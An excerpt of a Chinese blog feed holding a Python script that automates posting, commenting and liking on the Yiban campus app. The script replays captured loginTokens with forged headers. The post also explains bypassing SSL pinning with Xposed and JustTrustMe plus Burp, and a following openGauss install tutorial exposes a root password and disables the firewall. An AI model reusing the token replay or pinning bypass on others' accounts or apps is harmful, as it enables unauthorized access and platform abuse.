年的校级大学生创新实践基地，由知名互联网企业天涯社区与桂电的校企合作而成立的学生培养基地发展而来。</p><p>基地面向全校学生，以“培养具有创新意识和优秀开发能力的应用型计算机技术人才”为宗旨，以项目和任务驱动为主要形式，通过开展技术交流与培训、组织生产实习与实践、参加相关学科竞赛等活动，培养能将理论与实践相结合，具有较高设计与开发能力，具备良好团队协作精神的优秀人才。</p><p>从本基地走出了大量优秀人才，多名成员毕业后进入华为、京东等知名企业就业或就读研究生。</p><blockquote><p>招新群号：946146047</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 生活杂记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 生活杂记&amp;新生入学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>易班自动刷网薪系统</title>
      <link href="/posts/1206/"/>
      <url>/posts/1206/</url>
      
        <content type="html"><![CDATA[<blockquote><p>写在前面</p><p>Python 课最后的大作业，跟大哥们一起写这个小玩意，因为学院好像很喜欢刷这些东西，总体来说挺简单的</p><p>分到我的模块刚刚好需要手机抓包，网页端易班登陆进去没有发动态的模块了，模块在维护</p><p>2022.11.30：不知道这篇文章里面的脚本还有没有用，如果有需要就自己试试脚本还能不能用吧</p></blockquote><h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@Time : 2021/5/5</span></span><br><span class="line"><span class="string">@Author : C1everF0x</span></span><br><span class="line"><span class="string">@File : dongtai</span></span><br><span class="line"><span class="string">@Description : </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    登录模块其实没有真正实现，网页端登录已经能通过逆向分析 login.js 文件来获取易班对密码在前端的加密算法，可以真正实现模拟登录</span></span><br><span class="line"><span class="string">    app端无法通过抓包或分析接口地址来找到加密方式</span></span><br><span class="line"><span class="string">    第一次输入密码登陆过后，app会将 loginToken 嵌入到 app 里，下次打开会提取拼接到 autologin 接口的 url中</span></span><br><span class="line"><span class="string">    目前能想到的 app 端实现真正模拟登录两种方法：</span></span><br><span class="line"><span class="string">    1、app 端在登录时候对密码的加密是嵌在 app 的源码里，真要做可以通过逆向分析 app 源码，找到加密代码逆向破解</span></span><br><span class="line"><span class="string">    2、使用类似于 seleium 的 appium 来实现模拟真正的人进行登录，再从中提取出 loginToken</span></span><br><span class="line"><span class="string">    目前实现只能够是抓包拿 loginToken 来给到 autologin 接口进行伪造登录</span></span><br><span class="line"><span class="string">    2021.05.07</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    url = <span class="string">&quot;https://mobile.yiban.cn/api/v3/passport/autologin?access_token=e3017321cf9cdae74e34061cf7adef4a&quot;</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;YiBan/4.9.9 Mozilla/5.0 (Linux; Android 5.1.1; MI 9 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&#x27;Bearer e3017321cf9cdae74e34061cf7adef4a&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;loginToken&#x27;</span>: <span class="string">&#x27;e3017321cf9cdae74e34061cf7adef4a&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;AppVersion&#x27;</span>: <span class="string">&#x27;4.9.9&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url = url,headers = header)</span><br><span class="line">        r.raise_for_status()    <span class="comment"># 判断异常</span></span><br><span class="line">        r.encoding = r.apparent_encoding    <span class="comment"># 设置编码</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;登录成功&#x27;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;登录失败&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DongTai</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,token,neirong_dongtai,neirong_pinglun</span>):   <span class="comment"># 初始化类里面的私密属性</span></span><br><span class="line">        self.__token = token</span><br><span class="line">        self.neirong_dongtai = neirong_dongtai</span><br><span class="line">        self.__dongtai_hao = <span class="literal">None</span></span><br><span class="line">        self.neirong_pinglun = neirong_pinglun</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">release</span>(<span class="params">self,neirong_dongtai</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        自动发布动态，动态内容需要进行一次 url 编码</span></span><br><span class="line"><span class="string">        动态发布成功后会返回一个 json ，里面有每个动态专属的一个九位数的号码</span></span><br><span class="line"><span class="string">        之后对动态进行的点赞、评论操作，需要通过该号码定位是哪条动态</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        url = <span class="string">r&#x27;https://mobile.yiban.cn/api/v3/feeds/?access_token=&#x27;</span> + self.__token + <span class="string">&#x27;&amp;content=&#x27;</span> + urllib.parse.quote(neirong_dongtai) + <span class="string">&#x27;&amp;visibleScope=0&amp;artwork=0&amp;toUserIds=&amp;address=&amp;lat=&amp;lng=&amp;share=0&amp;shareTitle=&amp;shareUrl=&amp;shareContent=&amp;shareImage=&amp;shareSource=&amp;kind=1&amp;hiddenAddress=0&#x27;</span></span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;YiBan/4.9.9 Mozilla/5.0 (Linux; Android 5.1.1; MI 9 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&#x27;Bearer e3017321cf9cdae74e34061cf7adef4a&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;loginToken&#x27;</span>: <span class="string">&#x27;e3017321cf9cdae74e34061cf7adef4a&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;AppVersion&#x27;</span>: <span class="string">&#x27;4.9.9&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url,headers = header)</span><br><span class="line">            r.raise_for_status()</span><br><span class="line">            r.encoding = r.apparent_encoding</span><br><span class="line">            response_json = r.text</span><br><span class="line">            re_response_json = re.findall(<span class="string">r&#x27;\d&#123;9&#125;&#x27;</span>,response_json)   <span class="comment"># 正则匹配提取动态号码</span></span><br><span class="line">            self.__dongtai_hao = <span class="string">&#x27;&#x27;</span>.join(re_response_json)  <span class="comment"># 赋给私有变量</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;发布成功，该动态 id 为 &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(self.__dongtai_hao)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;发布失败&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 返回 json 样例，feedId 是动态号码</span></span><br><span class="line">        <span class="comment"># &#123;&quot;response&quot;: 100, &quot;message&quot;: &quot;\u8bf7\u6c42\u6210\u529f&quot;,</span></span><br><span class="line">        <span class="comment">#  &quot;data&quot;: &#123;&quot;feedId&quot;: 294594341, &quot;feedCheckinReward&quot;: null&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">give_good</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            自动给动态点赞</span></span><br><span class="line"><span class="string">            :return:</span></span><br><span class="line"><span class="string">            &#x27;&#x27;&#x27;</span></span><br><span class="line">        url = <span class="string">r&#x27;https://mobile.yiban.cn/api/v3/feeds/&#x27;</span> + self.__dongtai_hao + <span class="string">r&#x27;/ups?access_token=&#x27;</span> + self.__token</span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;YiBan/4.9.9 Mozilla/5.0 (Linux; Android 5.1.1; MI 9 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&#x27;Bearer e3017321cf9cdae74e34061cf7adef4a&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;loginToken&#x27;</span>: <span class="string">&#x27;e3017321cf9cdae74e34061cf7adef4a&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;AppVersion&#x27;</span>: <span class="string">&#x27;4.9.9&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, headers=header)</span><br><span class="line">            r.raise_for_status()</span><br><span class="line">            r.encoding = r.apparent_encoding</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;点赞成功&#x27;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;点赞失败&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">comments</span>(<span class="params">self,neirong_pinglun</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        自动给动态评论，内容需要进行一次 url 编码，通过之前发布存入私有变量的动态号码来确定需要评论哪条动态</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        url = <span class="string">r&#x27;https://mobile.yiban.cn/api/v3/feeds/&#x27;</span> + self.__dongtai_hao + <span class="string">&#x27;/comments?access_token=&#x27;</span> + self.__token + <span class="string">r&#x27;&amp;content=&#x27;</span> + urllib.parse.quote(neirong_pinglun) + <span class="string">r&#x27;&amp;toUserId=&amp;toCommentId=&#x27;</span></span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;YiBan/4.9.9 Mozilla/5.0 (Linux; Android 5.1.1; MI 9 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&#x27;Bearer e3017321cf9cdae74e34061cf7adef4a&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;loginToken&#x27;</span>: <span class="string">&#x27;e3017321cf9cdae74e34061cf7adef4a&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;AppVersion&#x27;</span>: <span class="string">&#x27;4.9.9&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, headers=header)</span><br><span class="line">            r.raise_for_status()</span><br><span class="line">            r.encoding = r.apparent_encoding</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;评论成功，评论内容为 &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(neirong_pinglun)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;评论失败&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(login())</span><br><span class="line">    token = <span class="string">&#x27;e6262d37a192f6be11c159f4080326d9&#x27;</span></span><br><span class="line">    neirong_dongtai = <span class="built_in">input</span>(<span class="string">&#x27;请输入动态内容：&#x27;</span>)</span><br><span class="line">    neirong_pinglun = <span class="built_in">input</span>(<span class="string">&#x27;请输入评论内容：&#x27;</span>)</span><br><span class="line">    dongtai = DongTai(token,neirong_dongtai,neirong_pinglun)    <span class="comment"># 实例化动态类，需要提供 loginToken，发布动态内容和评论内容</span></span><br><span class="line">    <span class="built_in">print</span>(dongtai.release(neirong_dongtai))</span><br><span class="line">    <span class="built_in">print</span>(dongtai.comments(neirong_pinglun))</span><br><span class="line">    <span class="built_in">print</span>(dongtai.give_good())</span><br></pre></td></tr></table></figure><p>最后结果如图：</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210509031647.png"></p><h1 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h1><ul><li><p>流程图如下</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210509032901.png"></p></li></ul><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul><li><p>使用 requests 库编写爬虫程序，实现模拟真实用户进行发布动态、评论动态和点赞动态的功能</p></li><li><p>使用 re 库对发布动态成功后的返回包进行解析，提取发布成功的动态的动态号码</p></li><li><p>搭建安卓虚拟机 + xposed 框架 + justTrustMe 模块，因为 app 可以自己检验 SSL 握手时服务器返回的证书是否合法，“SSL pinning” 技术指在 app 中只信任固定的证书和公钥，安卓 7.0 以上把证书分为系统证书和用户证书，有些 app 只信任系统证书，真实手机抓包会提示手机没网，所以需要使用 xposed 框架 + justTrustMe 模块，来 hook 掉本地证书强校验的逻辑，同时导入 burp 的证书，使其流量通过 burp，实现手机抓包</p><blockquote><p>Xposed 框架是一款开源框架，其功能是可以在不修改 APK 的情况下影响程序运行(修改系统)的框架服务，基于它可以制作出许多功能强大的模块，且在功能不冲突的情况下同时运作</p><p>JustTrustMe 一个用来禁用、绕过 SSL 证书检查的基于 Xposed 模块。简单来说，JustTrustMe 是将 APK 中所有用于校验 SSL 证书的 API 都进行了 Hook，从而绕过证书检查的</p></blockquote></li><li><p>抓包分析各个功能对 api 请求的 url 构造格式和 http 请求头的伪造方法</p></li><li><p>使用面向对象编程，将三个功能封装成类，方便团队进行最后的代码拼接</p></li></ul><h2 id="模拟登录"><a href="#模拟登录" class="headerlink" title="模拟登录"></a>模拟登录</h2><blockquote><p>​模拟登录模块其实没有真正实现，网页端登录已经能通过逆向分析 login.js 文件来获取易班对密码在前端的加密算法，可以真正实现模拟登录<br>​app 端无法通过抓包或分析接口地址来找到加密方式<br>在 app 里第一次输入密码成功登陆后，app 会将 loginToken 嵌入到 app 里，下次打开会提取拼接到请求 autologin api 接口的 url 中<br>​    目前能想到的 app 端实现真正模拟登录两种方法：<br>​    1、app 端在登录时候对密码的加密是嵌在 app 的源码里，真要做可以通过逆向分析 app 源码，找到加密代码逆向破解<br>​    2、使用类似于 seleium 的 appium 来实现模拟真正的人进行登录，再从中提取出 loginToken<br>​    目前实现只能够是抓包拿 loginToken 来给到 autologin 接口进行伪造登录</p></blockquote><h3 id="抓取-loginToken"><a href="#抓取-loginToken" class="headerlink" title="抓取 loginToken"></a>抓取 loginToken</h3><ul><li>假设已经配置好了安卓虚拟机环境，在安卓虚拟机上打开易班，同时用 burp 抓包</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210509211040.png"></p><ul><li>保存下来复制到代码里面，替换掉所有需要用到的地方</li></ul><h2 id="自动发布动态"><a href="#自动发布动态" class="headerlink" title="自动发布动态"></a>自动发布动态</h2><blockquote><p>自动发布动态，动态内容需要进行一次 url 编码<br>动态发布成功后会返回一个 json ，里面有每个动态专属的一个九位数的号码<br>之后对动态进行的点赞、评论操作，需要通过该号码定位是哪条动态</p></blockquote><h3 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h3><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210509211314.png"></p><ul><li>发布动态时需要在 url 中添加 access_token 参数，内容为之前抓取到的 loginToken，在 http 请求头里面还存在两个需要用到 loginToken 的头</li><li></li></ul><h2 id="自动评论动态"><a href="#自动评论动态" class="headerlink" title="自动评论动态"></a>自动评论动态</h2><blockquote><p>自动给动态评论，评论内容需要进行一次 url 编码，通过之前发布存入私有变量的动态号码来确定需要评论哪条动态</p></blockquote><h2 id="自动点赞动态"><a href="#自动点赞动态" class="headerlink" title="自动点赞动态"></a>自动点赞动态</h2><blockquote><p>拼接需要点赞的动态号进入请求点赞 api 的 url 中，请求即可完成点赞 </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>openGauss-VMware安装</title>
      <link href="/posts/36330/"/>
      <url>/posts/36330/</url>
      
        <content type="html"><![CDATA[<blockquote><p>写在前面</p><p>本教程适用于 0 基础小白，里面的很多命令、技术细节没有进行解释，因为那样要增补的内容太多了，都是一些 Linux 的相关知识，还有一些 openGauss 官方手册里面的内容，太过于啰嗦</p><p>学校上的数据库，安排的数据库的实验说要用华为这款开源的数据库，（估计是学校近些年一直跟华为合作），内核是拿 PostgreSQL 写的，老师给的教程是拿 VirtualBox 轻量级的那款虚拟机管理软件搭建虚拟机进行安装的，老师也已经给出了配好的 虚拟机.ovf 文件，直接导入就能用，但是我自己已经用了好久的 VMware ，不想再更换虚拟机软件，所以就索性自己找资料搭了环境，不算顺利，但是也学到了不少东西</p><p>第一次搭大概用了一个小时，第二次边写教程边搭倒是花了两个小时多</p><blockquote><p>2021.4.10</p><p>导出配好的虚拟机， vm 导入时候会自动分配 ip 地址，也就是如果要使用我导出的配好的虚拟机，那么 偷懒者的 vm 网络配置必须是采用静态分配，子网是 192.168.1.0，DHCP 需要配置静态分配地址跟导出虚拟机的 ip 地址一样，为 192.168.1.142 ，应该是能自定义虚拟机的 ip 地址的，但是没有继续往下研究了，因为发现用 docker 搭建这个环境会更加简单，下一篇博客写用 docker 怎么搭建</p><blockquote><p>2021.4.11</p><p>突然想到，其实安好 CentOS 之后就应该直接拿 xshell 连，用 xshell 的终端来输入命令，这样就不用手打那么多了，直接复制粘贴就行，但是博客文章里写开始用到 xshell 在后面位置，真是蠢</p></blockquote></blockquote></blockquote><h1 id="安装-CentOS-7-6"><a href="#安装-CentOS-7-6" class="headerlink" title="安装 CentOS 7.6"></a>安装 CentOS 7.6</h1><blockquote><p>一定得是 CentOS-7.6 的版本，因为华为官方的文档要求这样的，如果用的其他版本则需要更改配置</p><p>先 <code>vi /etc/redhat-releas</code> 打开编辑文件，然后将内容改为 <code>CentOS Linux release 7.6.2003 (Core)</code></p><blockquote><p>我没试过，因为我下的 CentOS 就是 7.6 的版本，但是老师给的教程文档里面这么写的</p></blockquote></blockquote><p>打开 VMware，创建虚拟机，在其上安装 CentOS，选择创建新的虚拟机</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410005151.png"></p><p>选自定义，兼容性也直接下一步，<strong>选稍后安装操作系统</strong></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410005240.png"></p><p>虚拟机名称，存放位置自己选，<strong>处理器和内核数量都选一个，内存要给 4g，不然可能出现报错</strong></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410005332.png"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410005340.png"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410005351.png"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410005400.png"></p><p>磁盘给 20-40g ，<strong>将虚拟磁盘存储为单个文件，这个比较方便</strong></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410005430.png"></p><p>因为不是一次分配，所以空间设置大些，网传 openGauss 安装有至少 20g 空间要求。</p><p>设置为单个文件，比较方便。</p><p><strong>点自定义硬件</strong>，再点<code>处理器</code>，虚拟化全部勾上，再点<code>新 CD/DVD</code> ，使用压缩包内的镜像，再删除<code>打印机和声卡</code></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410005447.png"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410005456.png"></p><p>点关闭，点完成，接着开启虚拟机</p><p>这个界面方向盘键选中第一个然后直接按 <strong><code>enter</code></strong></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410005511.png"></p><p>下面就一点点进行设置</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410005540.png"></p><p>设置时间，<strong>点一下第一个时钟然后点一下亚洲大陆，然后点完成</strong></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410005645.png"></p><p><strong>点一下安装位置然后点完成退出来，默认设置就行，再点 “网络和主机名”，打开以太网的开关</strong></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410005658.png"></p><p><strong>主机名字自己定一个，要记住，很重要，<code>ip</code> 地址也要记住，也很重要</strong></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410005711.png"></p><p>上图的信息很重要，在 openGauss 安装的时候，<code>clusterconfig.xml</code> 中的一些值便需要用到是上述信息，<code>ip</code> 地址和 <code>hostname</code> ，这里的 <code>ip</code> 地址是 <code>192.168.1.142</code>，<code>hostname</code> 是 <code>Aimerl0</code>，然后点开始安装</p><p>开始配置 root 密码，密码是：<code>010625.</code>（有个点），配置完以后就开始自动安装了，等待完成即可，安装完成，<code>reboot</code> 重启就可以了</p><h1 id="安装-openGauss"><a href="#安装-openGauss" class="headerlink" title="安装 openGauss"></a>安装 openGauss</h1><p>启动 CentOS，用 root 账户以及密码 <code>010625.</code> 登录后，就可以进行 openGauss 的安装了，在关键或者你不是很确定的地方，点击虚拟机左上角的建立快照，如果后续出问题了恢复快照</p><p>关闭防火墙和禁用防火墙</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop firewalld.service</span><br><span class="line">systemctl disable firewalld.service</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410010200.png"></p><p>之后输入命令，进入文档编辑状态，按键盘上面的 i 键 ，然后就可以对文档进行编辑，编辑后为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/selinux/config</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410010335.png"></p><p>编辑结束，需要保存，保存的方式为，先按键盘上的 <code>esc</code> 键，然后在屏幕下方输入<code>:wq</code>即可，如果编辑错误，不想保存，则输入的是<code>:q!</code>，注意都是英文字符。</p><p>然后重启，输入 <code>reboot</code></p><p>重启后，用账号 <code>root</code>，密码 <code>010625.</code> 登录后继续设置，先关闭内存交换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqapoff -a</span><br></pre></td></tr></table></figure><p>然后安装 <code>ifconfig</code> 的组件，输入 <code>yum install net-tools.x86_64</code>，自动下载安装包，<strong>如果有问填 y 还是n，都是 y</strong></p><p>安装完成后，我们就可以使用 <code>ifconfig</code> 命令了</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410010610.png"></p><p>下面测试 root 远程登录。命令：<code>ssh “你的ip，用ifconfig查”</code></p><p>输入密码后，需要等待一下，测试登录成功</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410010633.png"></p><p>下面需要联网升级安装 python3.6 ，命令：<code>yum install python3</code>，遇到问题就选 <strong>y</strong></p><p>继续安装压缩软件，输入命令：<code>yum install bzip2</code></p><p>然后一步安装相关的包，命令：<code>yum install -y libaio-devel flex bison ncurses-devel glibc.devel patch lsb_release wget</code></p><p>做个快照，随便起个记录当前干了什么的名</p><p>下面需要将一个重要的，在安装过程中会多次用到的配置文件放到虚拟机中，该配置文件名为 <code>clusterconfig.xml</code></p><p>需要修改的内容是标出来的内容，一个是<code>主机名</code>，一个是<code> ip 地址</code>，都是之前配置过的，<code>Aimerl0</code> 和 <code>192.168.1.142</code></p><p>在 <code>/opt/software/openGauss/</code>路径下创建 XML 配置文件，用于数据库安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@Aimerl0 openGauss]# vi clusterconfig.xml</span><br></pre></td></tr></table></figure><p>然后把下面的内容复制，粘贴到 vi 打开的 <code>clusterconfig.xml</code> 中，按 i 